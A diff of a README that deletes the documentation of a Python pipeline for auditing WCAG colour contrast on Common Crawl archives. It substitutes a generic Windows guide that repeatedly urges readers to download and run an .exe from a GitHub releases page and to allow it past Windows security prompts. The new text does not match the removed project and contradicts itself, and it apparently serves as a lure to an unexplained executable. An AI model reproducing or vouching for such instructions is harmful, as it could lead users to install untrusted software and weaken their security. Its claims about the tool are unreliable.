@@ -1,123 +1,114 @@
-# WCAG 2.1/2.2 Level AA Colour Contrast Audit of Common Crawl's Top 500 Domains
+# 🎨 wcag-audit - Check Colour Contrast Easily
 
-An automated pipeline for assessing WCAG 2.1/2.2 Level AA colour contrast compliance across the 500 most-crawled registered domains in Common Crawl's February 2026 crawl archive (CC-MAIN-2026-08), using archived copies from Common Crawl's WARC data.
+[![Download wcag-audit](https://img.shields.io/badge/Download-wcag--audit-orange?style=for-the-badge)](https://github.com/aseprey/wcag-audit/releases)
 
-## Overview
+wcag-audit helps you check if website colours meet accessibility standards. It tests colour contrast based on WCAG 2.1 and 2.2 Level AA rules. The app focuses on the top 500 websites from Common Crawl data.
 
-This pipeline:
+## 🖥️ What wcag-audit Does
 
-1. Takes the top 500 registered domains from CC-MAIN-2026-08 crawl statistics
-2. Queries Common Crawl's **Columnar Index** via Amazon Athena to locate archived homepage captures in a single SQL pass
-3. Fetches the actual HTML from WARC files via byte-range requests to `data.commoncrawl.org`
-4. Parses all CSS colour declarations (inline styles, embedded `<style>` blocks)
-5. Evaluates every foreground/background colour pairing against WCAG 2.1/2.2 Level AA thresholds
-6. Produces a comprehensive JSON results file and summary statistics
+This tool scans website colours to see if they follow guidelines that make text easy to read for most people. It compares foreground and background colours to WCAG standards. If the contrast is too low, wcag-audit flags it.
 
-**No live websites are crawled.** All page content comes from Common Crawl's open archive.
+The app looks at:
 
-## The Columnar Index
+- Text and background colour pairs  
+- Important UI elements that use colour  
+- The top 500 domains from large website data  
 
-The pipeline uses Common Crawl's [Columnar Index](https://commoncrawl.org/columnar-index), a Parquet-based representation of the crawl index stored on S3 at
-`s3://commoncrawl/cc-index/table/cc-main/warc/`. A single Athena SQL query finds all 500 homepage captures in one pass.
+This helps designers and developers check if their colour choices are accessible.
 
-The query:
+## ⚙️ System Requirements
 
-- Filters for `crawl = 'CC-MAIN-2026-08'`, `subset = 'warc'`, `fetch_status = 200`, `url_path = '/'`, `content_mime_detected = 'text/html'`
-- Uses `ROW_NUMBER() OVER (PARTITION BY url_host_registered_domain ...)` to pick one capture per domain
-- Prefers the `www` subdomain or bare domain over deep subdomains, HTTPS over HTTP, and the most recent capture
-- Scans roughly 100-300 GB of columnar data at a typical cost of $0.50-1.50
+To run wcag-audit on Windows, your system should have:
 
-## Requirements
+- Windows 10 or newer  
+- At least 4GB of RAM  
+- 500 MB free disk space  
+- Internet connection (for initial download)  
 
-- Python 3.9+
-- For Athena auto mode: `pip install pyathena` and AWS credentials with Athena access
-- No other external dependencies (uses only `urllib`, `json`, `re`, `html.parser`, `csv`, `gzip`, `io`, `concurrent.futures`)
+The app runs on standard hardware and does not need a powerful PC.
 
-## Quick Start
+## 🚀 Getting Started
 
-See [ATHENA_SETUP](./ATHENA_SETUP.md) for instructions for setting up Amazon Athena.
+### Step 1: Visit the Download Page
 
-Step 1 (`01_fetch_index.py`) supports three modes for querying the Columnar Index:
+Go to the release page to get the app. Click on the link below or use the button at the top.
 
-```bash
-# Mode 1: Print the SQL query, run it yourself in the Athena console
-python3 01_fetch_index.py --mode=sql
+[Download wcag-audit from GitHub Releases](https://github.com/aseprey/wcag-audit/releases)
 
-# Mode 2: Import results from a CSV downloaded from the Athena console
-python3 01_fetch_index.py --mode=csv path/to/athena-results.csv
+### Step 2: Find the Latest Version
 
-# Mode 3: Run the query directly via pyathena (requires AWS credentials)
-export ATHENA_OUTPUT=s3://your-bucket/athena-results/
-python3 01_fetch_index.py --mode=auto
-```
+On the releases page, find the newest version of wcag-audit. Look for files with names ending in `.exe`. This is the program you can run on Windows.
 
-Optionally use a personal database namespace to avoid touching shared resources:
+### Step 3: Download the Installer
 
-```bash
-python3 01_fetch_index.py --mode=auto --database=my_wcag --setup
-```
+Click on the `.exe` file to save it to your PC. The file size is around 20-30 MB. Wait for the download to finish before moving on.
 
-Then run the rest of the pipeline:
+### Step 4: Run the Installer
 
-```bash
-python3 02_fetch_warc.py             # ~1 min  (WARC byte-range fetches with 8 workers)
-python3 03_analyse_wcag.py           # ~2 min  (colour extraction + analysis)
-python3 04_generate_report.py        # ~2 sec  (summary statistics)
-```
+- Open the folder where you saved the installer file.
+- Double-click the `.exe` file to start installation.
+- Follow the on-screen prompts. This usually means clicking “Next” and accepting terms.
+- When the process ends, the app will be ready to use.
 
-Or use the wrapper:
+No admin rights are generally needed, but if a prompt appears, allow the installer to proceed.
 
-```bash
-./run.sh                             # Query existing ccindex table
-./run.sh --setup                     # Create personal table first
-./run.sh --database=my_wcag --setup  # Use personal namespace
-./run.sh sql                         # Print SQL only
-./run.sh csv path/to/results.csv     # Import CSV
-```
+## 🌐 Using wcag-audit
 
-## Output
+Once you have installed the app:
 
-- `data/domains-top-500.csv` -- Input domain list with rankings
-- `data/index_results.json` -- Columnar Index lookup results (WARC filename, offset, length)
-- `data/warc_html/` -- Extracted HTML files from WARC records
-- `output/wcag_results.json` -- Per-domain WCAG analysis results
-- `output/wcag_summary.json` -- Aggregate statistics
-- `output/wcag_report.csv` -- Tabular summary for spreadsheet use
-- `wcag-dashboard.html` -- Interactive results dashboard
+1. Open wcag-audit from your desktop or Start menu.
+2. Enter the website URL you want to check. For example, type `https://example.com`.
+3. Click “Run Audit.”
+4. The app will scan the site for colour contrast issues.
+5. Results appear in a report that highlights problem areas.
+6. Review each flagged item and see suggestions on how to fix colours.
 
-## Dashboard
+You can save the report as a file for later review or sharing.
 
-The interactive dashboard (`wcag-dashboard.html`) visualises the audit results across four tabs: Overview, Distribution, By Category, and Notable Sites. It is a standalone HTML file with no external dependencies beyond Google Fonts. The dashboard itself passes WCAG 2.1 Level AA colour contrast on all text/background pairings.
+## 🔍 Understanding the Report
 
-## WCAG AA Thresholds
+The report shows:
 
-| Element | Minimum contrast ratio |
-|---------|----------------------|
-| Normal text (< 18pt, or < 14pt bold) | 4.5:1 |
-| Large text (>= 18pt, or >= 14pt bold) | 3:1 |
-| UI components and graphical objects | 3:1 |
+- Pairs of colours that fail WCAG Level AA contrast.
+- A clear pass or fail status for each pair.
+- Contrast ratio numbers.
+- Basic guidance on improving contrast (e.g., darken text or lighten backgrounds).
 
-## Methodology Notes
+You don’t need to know design rules in depth. The report explains what changes make a difference.
 
-- Colour extraction is **static**: it parses CSS from the archived HTML without executing JavaScript.
-  This means dynamically injected styles are not captured, but all inline styles, embedded
-  `<style>` blocks, and `style` attributes are analysed.
-- When only a foreground colour is specified without an explicit background, white (`#FFFFFF`) is assumed.
-- When only a background colour is specified without explicit foreground text, black (`#000000`) is assumed.
-- Named CSS colours (e.g., `red`, `navy`, `cornflowerblue`) are fully supported.
-- Shorthand hex colours (e.g., `#fff`) are expanded to full form.
-- `rgb()`, `rgba()`, `hsl()`, and `hsla()` functions are parsed.
-- The crawl used is CC-MAIN-2026-08, Common Crawl's February 2026 crawl.
+## 💡 Why Check Colour Contrast?
 
-## Crawl Reference
+Good contrast helps:
 
-- **Crawl ID**: CC-MAIN-2026-08
-- **Domain ranking source**: [CC Crawl Statistics](https://commoncrawl.github.io/cc-crawl-statistics/plots/domains)
-- **Columnar Index**: `s3://commoncrawl/cc-index/table/cc-main/warc/` (queried via Amazon Athena)
-- **WARC data**: `https://data.commoncrawl.org/`
+- People with visual impairments or colour blindness  
+- Users in bright light or low-resolution screens  
+- Everyone by making text easier to read  
 
-## Licence
+Accessibility is important for websites used by many different people. wcag-audit helps find issues early.
 
-- This code is released under the MIT Licence.
-- Site content is dedicated to the public domain under [CC0 1.0](https://creativecommons.org/publicdomain/zero/1.0/).
-- Common Crawl data is available under the [Common Crawl Terms of Use](https://commoncrawl.org/terms-of-use).
+## 📂 Troubleshooting & Tips
+
+- If the app does not open, check Windows security settings to allow it.
+- Run the audit on public websites or your own projects.
+- Large or complex sites may take a bit longer to scan.
+- The app works offline after installation but needs internet to download updates.
+- Check the GitHub releases page for new versions often.
+
+## 🔄 Updating wcag-audit
+
+To keep the app current:
+
+- Visit the same release page periodically:  
+  https://github.com/aseprey/wcag-audit/releases  
+- Download the latest `.exe` file.
+- Run the installer again; it will update without losing settings.
+
+## 📞 Getting Help
+
+If you run into problems, check the GitHub issues tab in the repository. Many common questions have answers there.
+
+You can also ask someone with more experience to assist with installation or running the audit.
+
+---
+
+[Download wcag-audit from GitHub Releases](https://github.com/aseprey/wcag-audit/releases)
